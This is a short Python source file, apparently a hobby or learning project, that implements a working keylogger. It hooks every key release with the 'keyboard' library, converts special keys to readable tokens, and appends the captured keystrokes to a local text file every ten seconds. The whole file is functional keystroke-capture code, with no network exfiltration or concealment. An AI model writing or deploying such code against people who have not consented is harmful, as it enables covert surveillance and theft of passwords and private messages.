import keyboard
import sys
from threading import Semaphore, Timer

INTERVAL = 10

class Keylogger:
    def __init__(self, fileName, interval):
        self.key = ""
        self.fileName = fileName
        self.interval = interval
        self.semaphore = Semaphore(0)


    def callback(self, event):
        name = event.name

        if len(name) > 1:
            if name == 'space':
                name = " "
            elif name == 'enter':
                name = "enter\n"
            elif name == 'decimal':
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.key += name

            

    def __writeFile(self, buffer):
        fp = open(self.fileName, 'a')
        fp.write(buffer)
        fp.close()

    def report(self):
        if self.key:
            self.__writeFile(self.key)
        self.key = ""
        Timer(interval=self.interval, function=self.report).start()
    
    def run(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()

if __name__ == "__main__":
    keyLogger = Keylogger("testKeyboard.txt", INTERVAL)
    keyLogger.run()




